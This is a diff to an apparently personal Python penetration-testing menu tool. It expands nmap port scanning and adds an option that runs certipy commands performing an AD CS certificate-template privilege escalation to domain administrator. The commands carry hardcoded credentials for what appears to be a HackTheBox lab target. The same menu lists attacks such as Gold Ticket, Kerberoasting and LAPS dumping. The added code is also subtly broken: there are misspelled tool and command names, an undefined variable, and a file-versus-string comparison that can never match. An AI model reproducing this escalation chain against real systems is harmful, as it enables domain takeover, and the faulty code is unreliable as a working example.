@@ -35,6 +35,7 @@ import linecache
 import itertools
 
 from termcolor import colored
+from collections import OrderedDict
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.dcomrt import IObjectExporter
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
@@ -62,10 +63,7 @@ else:
 # -------------------------------------------------------------------------------------
 
 def sort(string):
-   localCOM("echo " + string + " > numbers.tmp")
-   localCOM("cat numbers.tmp | uniq > unique.tmp")
-   localCOM("cat unique.tmp  | sort > sorted.tmp")
-   revision = linecache.getline("sorted.tmp", 1).rstrip("\n")
+   revision = ",".join(OrderedDict.fromkeys(string.split(',')))
    return revision
 
 def cutLine(variable1, variable2):
@@ -313,10 +311,20 @@ def getTCPorts():
       return "EMPTY"
    else:
       print(colored("[*] Attempting to enumerate live tcp ports, please wait...", colour3))
-      nmap = nmap3.NmapScanTechniques()
-      results = nmap.nmap_tcp_scan(TIP.rstrip(" "),args="-p0-65535") # Dict
-      with open("tcp.json", "w") as outfile:
+      nmap = nmap3.NmapScanTechniques()      
+      print("[+] Attempting to enumerate well known ports 0-1023...")
+      results = nmap.nmap_tcp_scan(TIP.rstrip(" "),args="-p 0-1023") # Dict
+      with open("tcp1.json", "w") as outfile:
          json.dump(results, outfile, indent=4)         
+      print("[+] Attempting to enumerate registered ports 1024-49151...")
+      results = nmap.nmap_tcp_scan(TIP.rstrip(" "),args="-p 1024-49151") # Dict
+      with open("tcp2.json", "w") as outfile:
+         json.dump(results, outfile, indent=4)
+      print("[+] Attempting to enumerate dynamic ports 49152-65535...")
+      results = nmap.nmap_tcp_scan(TIP.rstrip(" "),args="-p 49152-65535") # Dict
+      with open("tcp3.json", "w") as outfile:
+         json.dump(results, outfile, indent=4)         
+      localCOM("cat tcp1.json > tcp.json; cat tcp2.json >> tcp.json; cat tcp3.json >> tcp.json")
       localCOM("cat tcp.json | grep 'portid' | cut -d ':' -f 2 | tr '\n' ' ' | tr -d '[:space:]' | sed 's/,$//' > ports1.tmp")
       localCOM("cat tcp.json | grep 'name' | cut -d ':' -f 2 | tr '\n' ' ' | tr -d '[:space:]' | sed 's/,$//' > service1.tmp")
       this_Ports = linecache.getline("ports1.tmp", 1).rstrip("\n") 
@@ -782,7 +790,7 @@ def dispMenu():
    
 def options():
    print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Gold Ticket (71) ServScanner (81) gRPClient   (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DNS    (500) Nuclei Scanner (600) LFI OS Checker (700)           (   )                     " + '\u2551')   
-   print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set SUBDOMAIN (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Gold DC PAC (72) VulnScanner (82)             (92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Dig DNS      (501) Nuclei WP Scan (601) LFI   Wordlist (   )           (   )                     " + '\u2551')      
+   print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set SUBDOMAIN (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Gold DC PAC (72) VulnScanner (82) GenFakecert (92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Dig DNS      (501) Nuclei WP Scan (601) LFI   Wordlist (   )           (   )                     " + '\u2551')      
    print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set FILE NAME (33) Services (43) Sam Dump Users (53) KerberosBrute (63) Domain Dump (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Enum DOMAIN  (502) Wordpress Scan (602) Nuclei LFI     (   )           (   )                     " + '\u2551')   
    print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Set SHARENAME (34) AT  Exec (44) REGistry Hives (54) KerbeRoasting (64) Blood Hound (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Recon DOMAIN (503) WP Plugin Scan (603)                (   )           (   )                     " + '\u2551')
    print('\u2551' + "(05) Re/Set WEBSITE URL (15) Re/Set SERVERS   (35) DComExec (45) Enum EndPoints (55) ASREPRoasting (65) LAPS Dumper (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) Enum Sub-DOM (504)                (604)                (   )           (   )                     " + '\u2551')
@@ -1295,6 +1303,7 @@ while True:
       BAK = POR
       POR = input("[?] Please enter port numbers: ")      
       if POR != "":
+         POR = sort(POR)
          PTS = POR
          POR = spacePadding(POR, COL1)
       else:
@@ -3326,7 +3335,31 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-# - HERE 
+   if selection =='81':
+      prompt() 
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Certipy parsFile
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='82':
+      remoteCOM("crackmnapexec smb " + TIP.rstrip(" ") + " -d " + DOM.strip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -x whoam /all > priv.tmp")
+      catsfile(priv.tmp)
+      file = open("priv.tmp")
+      if ("SeMachineAccountPrivilege" == file):
+        localCOM("certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -add-officer raven -ca 'manager-DC01-CA'")
+        localCOM("certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -enable-template 'SubCA'")
+        localCOM("certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -template SubCA -upn administrator@manager.htb -target manager.htb")
+        localCOM("certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -issue-request 45")
+        localCOM("certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -retrieve 45")
+        localCOM("certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236 -domain manager.htb -username administrator")
+      else:
+         pass
+      prompt() 
  
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
